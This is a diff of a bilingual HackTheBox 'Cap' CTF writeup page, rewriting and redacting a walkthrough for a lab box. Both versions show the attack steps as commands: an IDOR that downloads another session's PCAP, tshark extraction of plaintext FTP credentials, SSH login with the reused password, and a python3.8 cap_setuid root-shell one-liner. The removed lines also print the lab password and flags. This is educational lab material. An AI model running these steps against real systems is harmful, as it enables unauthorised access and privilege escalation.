@@ -4,24 +4,24 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Cap — HackTheBox CTF Writeup | CyberStefan</title>
-  <meta name="description" content="HackTheBox — Cap (Easy) Writeup Recon An initial Nmap scan of the target revealed three open ports: Port State Service 21/tcp open vsftpd 3.0.3 22/tcp…">
+  <meta name="description" content="HackTheBox Cap (Easy): anonieme FTP faalde, maar een IDOR op /data/0 gaf een PCAP met plaintext FTP-creds, en cap_setuid op python3.8 was de weg naar root.">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="CyberStefan">
   <meta property="og:title" content="Cap CTF Writeup — CyberStefan">
-  <meta property="og:description" content="HackTheBox — Cap (Easy) Writeup Recon An initial Nmap scan of the target revealed three open ports: Port State Service 21/tcp open vsftpd 3.0.3 22/tcp…">
+  <meta property="og:description" content="HackTheBox Cap (Easy): anonieme FTP faalde, maar een IDOR op /data/0 gaf een PCAP met plaintext FTP-creds, en cap_setuid op python3.8 was de weg naar root.">
   <meta property="og:url" content="https://cyberstefan.nl/writeup/cap/">
   <meta property="og:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Cap CTF Writeup — CyberStefan">
-  <meta name="twitter:description" content="HackTheBox — Cap (Easy) Writeup Recon An initial Nmap scan of the target revealed three open ports: Port State Service 21/tcp open vsftpd 3.0.3 22/tcp…">
+  <meta name="twitter:description" content="HackTheBox Cap (Easy): anonieme FTP faalde, maar een IDOR op /data/0 gaf een PCAP met plaintext FTP-creds, en cap_setuid op python3.8 was de weg naar root.">
   <meta name="twitter:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <link rel="canonical" href="https://cyberstefan.nl/writeup/cap/">
   <link rel="icon" type="image/x-icon" href="/favicon.ico">
   <link rel="icon" type="image/png" sizes="192x192" href="/favicon.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/style.css">
-  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Cap — HackTheBox CTF Writeup", "description": "HackTheBox — Cap (Easy) Writeup Recon An initial Nmap scan of the target revealed three open ports: Port State Service 21/tcp open vsftpd 3.0.3 22/tcp…", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-04", "dateModified": "2026-04-04", "keywords": "Enumeration, Web, Linux, Privesc, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/cap/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
+  <link rel="stylesheet" href="/assets/style.css?v=2">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Cap — HackTheBox CTF Writeup", "description": "HackTheBox Cap (Easy): anonieme FTP faalde, maar een IDOR op /data/0 gaf een PCAP met plaintext FTP-creds, en cap_setuid op python3.8 was de weg naar root.", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-04", "dateModified": "2026-04-04", "keywords": "Enumeration, Web, Linux, Privesc, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/cap/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
   <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home", "item": "https://cyberstefan.nl/"}, {"@type": "ListItem", "position": 2, "name": "Cap Writeup", "item": "https://cyberstefan.nl/writeup/cap/"}]}</script>
 </head>
 <body>
@@ -79,72 +79,61 @@
     </p>
   </div>
 
-  <div class="writeup-body lang-en"><h2>HackTheBox — Cap (Easy) Writeup</h2>
+  <div class="writeup-body lang-en"><h2>HackTheBox — Cap (Easy)</h2>
 <h2>Recon</h2>
-<p>An initial Nmap scan of the target revealed three open ports:</p>
 <pre><code>nmap -sC -sV 10.129.19.233</code></pre>
-<p>| Port | State | Service |<br>|------|-------|---------|<br>| 21/tcp | open | vsftpd 3.0.3 |<br>| 22/tcp | open | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |<br>| 80/tcp | open | Gunicorn — Security Dashboard |</p>
-<p>Anonymous FTP login was attempted but failed. Port 80 exposed a web application titled &quot;Security Dashboard&quot; with three endpoints in the navigation menu:</p>
-<ul><li><code>/capture</code> — Security Snapshot (5-second PCAP + analysis), always redirects to <code>/data/1</code></li><li><code>/ip</code> — displays <code>ifconfig</code> output</li><li><code>/netstat</code> — displays active network connections</li></ul>
-<pre><code>curl -s http://10.129.19.233/capture -v
-<h2>→ 302 redirect to /data/1</h2>
-curl -s http://10.129.19.233/data/0
-<h2>→ page with Download button pointing to /download/0</code></pre></h2>
-<p><strong>IDOR discovered:</strong> <code>/capture</code> always redirects to <code>/data/1</code>, but manually requesting <code>/data/0</code> reveals a download button for a previously stored PCAP file.</p>
-<h2>Exploitation</h2>
-<p><strong>Attack vector:</strong> IDOR (Insecure Direct Object Reference) → PCAP download → plaintext FTP credentials</p>
-<p>By downloading the PCAP at <code>/download/0</code> and analysing it with <code>tshark</code>, FTP credentials were found in plaintext:</p>
+<p>FTP, SSH and a web app on 80:</p>
+<p>| Port | State | Service |<br>|------|-------|---------|<br>| 21   | open  | vsftpd 3.0.3 |<br>| 22   | open  | OpenSSH 8.2p1 |<br>| 80   | open  | Gunicorn — &quot;Security Dashboard&quot; |</p>
+<p>Tried anonymous FTP first — no luck, it just rejected the login. So onto the web app. &quot;Security Dashboard&quot; had three things in the menu: <code>/capture</code> (a 5-second PCAP, always bounces you to <code>/data/1</code>), <code>/ip</code> (<code>ifconfig</code> output) and <code>/netstat</code>.</p>
+<p>The fact that <code>/capture</code> always redirected to <code>/data/1</code> made me curious what <code>/data/0</code> would do. And there it was — a download button for an earlier PCAP that wasn&#x27;t mine. Classic IDOR; the ID is just a sequential number with no access check.</p>
+<h2>Foothold</h2>
+<p>Pulled <code>/download/0</code> and ran it through tshark:</p>
 <pre><code>curl -s http://10.129.19.233/download/0 -o capture.pcap
 tshark -r capture.pcap -Y &quot;ftp&quot; -T fields -e ftp.request.command -e ftp.request.arg</code></pre>
-<p><strong>Output:</strong><br><pre><code>USER    nathan<br>PASS    Buck3tH4TF0RM3!</code></pre></p>
-<p>These credentials were reused for SSH:</p>
-<pre><code>ssh nathan@10.129.19.233
-<h2>password: Buck3tH4TF0RM3!</code></pre></h2>
-<p><strong>User flag:</strong> <code>2874475212d535da1ca01f207b3a6939</code></p>
-<h2>Privilege Escalation</h2>
-<p>Enumeration of Linux capabilities revealed a misconfigured Python binary:</p>
-<pre><code>getcap -r / 2&gt;/dev/null</code></pre>
-<pre><code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></pre>
-<p><code>python3.8</code> has the <code>cap_setuid</code> capability, which allows the process to change its own UID to 0 (root) without requiring a SUID binary.</p>
-<pre><code>python3.8 -c &#x27;import os; os.setuid(0); os.system(&quot;bash&quot;)&#x27;</code></pre>
-<pre><code>uid=0(root) gid=1001(nathan) groups=1001(nathan)</code></pre>
-<p><strong>Root flag:</strong> <code>006b90cfdd1f951eb31fe3278eb85847</code></p>
-<h2>Lessons Learned</h2>
-<p>1. <strong>IDOR in sequential numeric IDs:</strong> Always test low-numbered IDs (0, 1, 2) on <code>/data/N</code> or <code>/download/N</code> endpoints. Sequential IDs without access control expose data belonging to other users or sessions.</p>
-<p>2. <strong>FTP transmits credentials in plaintext:</strong> Any PCAP containing FTP traffic will expose credentials directly. <code>tshark -Y &quot;ftp&quot;</code> extracts USER/PASS in seconds. Never use FTP where TLS-protected alternatives exist.</p>
-<p>3. <strong>Linux Capabilities (<code>getcap -r /</code>) is essential in privilege escalation enumeration.</strong> <code>cap_setuid</code> on an interpreter (Python, Perl, Ruby) is immediately exploitable with <code>os.setuid(0)</code>. This is documented on GTFOBins.</p>
-<p>4. <strong>Machine name as a hint:</strong> &quot;Cap&quot; references both the PCAP capture file and Linux Capabilities — a deliberate double meaning pointing to both attack vectors.</p></div>
-  <div class="writeup-body lang-nl" hidden><h2>HackTheBox — Cap (Easy) Writeup</h2>
+<p>FTP is plaintext, so the creds were just sitting there:</p>
+<pre><code>USER  nathan
+PASS  [REDACTED]</code></pre>
+<p>Same password worked on SSH (credential reuse, of course):</p>
+<pre><code>ssh nathan@10.129.19.233</code></pre>
+<p>And <code>user.txt</code> was there. (<code>[REDACTED]</code>)</p>
+<h2>Privesc</h2>
+<p>Checked capabilities — that&#x27;s usually the first thing I do on a box named &quot;Cap&quot;, and the name turned out to be a double hint (PCAP <em>and</em> capabilities):</p>
+<pre><code>getcap -r / 2&gt;/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></pre>
+<p><code>cap_setuid</code> on the Python binary means it can set its own UID to 0 without being SUID. Straight from GTFOBins:</p>
+<pre><code>python3.8 -c &#x27;import os; os.setuid(0); os.system(&quot;bash&quot;)&#x27;
+# uid=0(root)</code></pre>
+<p>Root, <code>root.txt</code>. (<code>[REDACTED]</code>)</p>
+<h2>What I took away</h2>
+<p>Whenever an endpoint redirects to <code>/data/1</code>, try <code>/data/0</code> — sequential IDs without an access check are an IDOR waiting to happen. And the box name was a giveaway in hindsight: &quot;Cap&quot; pointed at both the capture file and Linux capabilities, I just didn&#x27;t connect it until I was already at the getcap stage.</p></div>
+  <div class="writeup-body lang-nl" hidden><h2>HackTheBox — Cap (Easy)</h2>
 <h2>Recon</h2>
-<p>Een initiële Nmap-scan van het doelwit onthulde drie open poorten:</p>
 <pre><code>nmap -sC -sV 10.129.19.233</code></pre>
-<p>| Poort | Status | Dienst |<br>|-------|--------|--------|<br>| 21/tcp | open | vsftpd 3.0.3 |<br>| 22/tcp | open | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |<br>| 80/tcp | open | Gunicorn — Security Dashboard |</p>
-<p>Anoniem inloggen op FTP werd geprobeerd maar werkte niet. Poort 80 toonde een webapplicatie met de naam &quot;Security Dashboard&quot; met drie endpoints in het navigatiemenu:</p>
-<ul><li><code>/capture</code> — Security Snapshot (5 seconden PCAP + analyse), stuurt altijd door naar <code>/data/1</code></li><li><code>/ip</code> — toont output van <code>ifconfig</code></li><li><code>/netstat</code> — toont actieve netwerkverbindingen</li></ul>
-<strong>IDOR ontdekt:</strong> <code>/capture</code> stuurt altijd door naar <code>/data/1</code>, maar handmatig <code>/data/0</code> opvragen geeft een downloadknop voor een eerder opgeslagen PCAP-bestand.
-<h2>Exploitation</h2>
-<p><strong>Aanvalsvector:</strong> IDOR (Insecure Direct Object Reference) → PCAP downloaden → plaintext FTP-credentials</p>
-<p>Door de PCAP op <code>/download/0</code> te downloaden en te analyseren met <code>tshark</code> werden FTP-credentials in plaintext gevonden:</p>
+<p>FTP, SSH en een webapp op 80:</p>
+<p>| Poort | Status | Service |<br>|-------|--------|---------|<br>| 21    | open   | vsftpd 3.0.3 |<br>| 22    | open   | OpenSSH 8.2p1 |<br>| 80    | open   | Gunicorn — &quot;Security Dashboard&quot; |</p>
+<p>Eerst anonieme FTP geprobeerd — niks, login werd gewoon geweigerd. Dus door naar de webapp. &quot;Security Dashboard&quot; had drie dingen in het menu: <code>/capture</code> (een PCAP van 5 seconden, stuurt je altijd door naar <code>/data/1</code>), <code>/ip</code> (<code>ifconfig</code>-output) en <code>/netstat</code>.</p>
+<p>Dat <code>/capture</code> altijd naar <code>/data/1</code> redirecte maakte me benieuwd wat <code>/data/0</code> zou doen. En ja hoor — een downloadknop voor een eerdere PCAP die niet van mij was. Klassieke IDOR; de ID is gewoon een oplopend nummer zonder access check.</p>
+<h2>Foothold</h2>
+<p><code>/download/0</code> opgehaald en door tshark gehaald:</p>
 <pre><code>curl -s http://10.129.19.233/download/0 -o capture.pcap
 tshark -r capture.pcap -Y &quot;ftp&quot; -T fields -e ftp.request.command -e ftp.request.arg</code></pre>
-<p><strong>Output:</strong><br><pre><code>USER    nathan<br>PASS    Buck3tH4TF0RM3!</code></pre></p>
-<p>Deze credentials werden hergebruikt voor SSH:</p>
-<pre><code>ssh nathan@10.129.19.233
-<h2>wachtwoord: Buck3tH4TF0RM3!</code></pre></h2>
-<p><strong>User flag:</strong> <code>2874475212d535da1ca01f207b3a6939</code></p>
-<h2>Privilege Escalation</h2>
-<p>Enumeratie van Linux capabilities onthulde een verkeerd geconfigureerde Python-binary:</p>
-<pre><code>getcap -r / 2&gt;/dev/null</code></pre>
-<pre><code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></pre>
-<p><code>python3.8</code> heeft de <code>cap_setuid</code> capability — hiermee kan het proces zijn eigen UID aanpassen naar 0 (root), zonder dat de binary SUID hoeft te zijn.</p>
-<pre><code>python3.8 -c &#x27;import os; os.setuid(0); os.system(&quot;bash&quot;)&#x27;</code></pre>
-<pre><code>uid=0(root) gid=1001(nathan) groups=1001(nathan)</code></pre>
-<p><strong>Root flag:</strong> <code>006b90cfdd1f951eb31fe3278eb85847</code></p>
-<h2>Geleerde lessen</h2>
-<p>1. <strong>IDOR in opeenvolgende numerieke IDs:</strong> Test altijd lage nummers (0, 1, 2) bij <code>/data/N</code> of <code>/download/N</code> endpoints. Opeenvolgende IDs zonder toegangscontrole geven toegang tot data van andere gebruikers of sessies.</p>
-<p>2. <strong>FTP verstuurt credentials in plaintext:</strong> Elke PCAP met FTP-verkeer bevat de inloggegevens direct leesbaar. <code>tshark -Y &quot;ftp&quot;</code> toont USER/PASS in seconden. Gebruik nooit FTP waar TLS-beschermde alternatieven beschikbaar zijn.</p>
-<p>3. <strong>Linux Capabilities (<code>getcap -r /</code>) is essentieel bij privilege escalation.</strong> <code>cap_setuid</code> op een interpreter (Python, Perl, Ruby) is direct misbruikbaar met <code>os.setuid(0)</code>. Dit staat gedocumenteerd op GTFOBins.</p>
-<p>4. <strong>Machinenaam als hint:</strong> &quot;Cap&quot; verwijst naar zowel de PCAP-capture als Linux Capabilities — een bewuste dubbele betekenis die wijst op beide aanvalsvectoren.</p></div>
+<p>FTP is plaintext, dus de creds lagen er gewoon in:</p>
+<pre><code>USER  nathan
+PASS  [REDACTED]</code></pre>
+<p>Zelfde wachtwoord werkte op SSH (credential reuse, natuurlijk):</p>
+<pre><code>ssh nathan@10.129.19.233</code></pre>
+<p>En <code>user.txt</code> binnen. (<code>[REDACTED]</code>)</p>
+<h2>Privesc</h2>
+<p>Capabilities gecheckt — op een box die &quot;Cap&quot; heet doe ik dat sowieso als eerste, en die naam bleek een dubbele hint (PCAP <em>én</em> capabilities):</p>
+<pre><code>getcap -r / 2&gt;/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></pre>
+<p><code>cap_setuid</code> op de Python-binary betekent dat-ie zijn eigen UID op 0 kan zetten zonder SUID te zijn. Recht uit GTFOBins:</p>
+<pre><code>python3.8 -c &#x27;import os; os.setuid(0); os.system(&quot;bash&quot;)&#x27;
+# uid=0(root)</code></pre>
+<p>Root, <code>root.txt</code>. (<code>[REDACTED]</code>)</p>
+<h2>Wat ik eruit haalde</h2>
+<p>Als een endpoint je naar <code>/data/1</code> redirect, probeer dan <code>/data/0</code> — oplopende IDs zonder access check zijn een IDOR die op gebeuren staat. En de naam van de box was achteraf een weggevertje: &quot;Cap&quot; sloeg op zowel het capture-bestand als Linux capabilities, ik legde dat verband pas toen ik al bij getcap zat.</p></div>
+  <div id="media-section"></div>
 
   <div style="margin-top:32px;padding:18px 20px;background:#161b22;border:1px solid #30363d;border-radius:10px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap">
     <span class="lang-en" style="font-size:.9rem;color:#cdd9e5">Want to try this CTF challenge yourself?</span>
@@ -159,6 +148,12 @@ tshark -r capture.pcap -Y &quot;ftp&quot; -T fields -e ftp.request.command -e ft
     <span class="lang-en" style="font-size:.82rem;color:#6e7681">🔒 Protect your IP while hacking — use a VPN</span>
     <span class="lang-nl" hidden style="font-size:.82rem;color:#6e7681">🔒 Bescherm je IP tijdens het hacken — gebruik een VPN</span>
     <a href="https://go.nordvpn.net/aff_c?offer_id=15&amp;aff_id=146180&amp;url_id=902" target="_blank" rel="noopener sponsored" style="font-size:.78rem;color:#58a6ff;text-decoration:none;white-space:nowrap;flex-shrink:0">NordVPN →</a>
+  </div>
+
+  <div style="margin-top:12px;padding:14px 18px;background:#0d1117;border:1px solid #21262d;border-radius:8px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap">
+    <span class="lang-en" style="font-size:.82rem;color:#6e7681">🚩 New to CTF? TryHackMe is perfect for beginners</span>
+    <span class="lang-nl" hidden style="font-size:.82rem;color:#6e7681">🚩 Nieuw in CTF? TryHackMe is perfect voor beginners</span>
+    <a href="https://tryhackme.sjv.io/Gb06VL" target="_blank" rel="noopener sponsored" style="font-size:.78rem;color:#c11111;text-decoration:none;white-space:nowrap;flex-shrink:0">TryHackMe →</a>
   </div>
 </main>
 
@@ -192,6 +187,7 @@ tshark -r capture.pcap -Y &quot;ftp&quot; -T fields -e ftp.request.command -e ft
   });
 })();
 </script>
-<script src="/static/tracker.js" defer></script>
+<script>window._WRITEUP_ID = 4;</script>
+<script src="/assets/media-loader.js" defer></script>
 </body>
 </html>
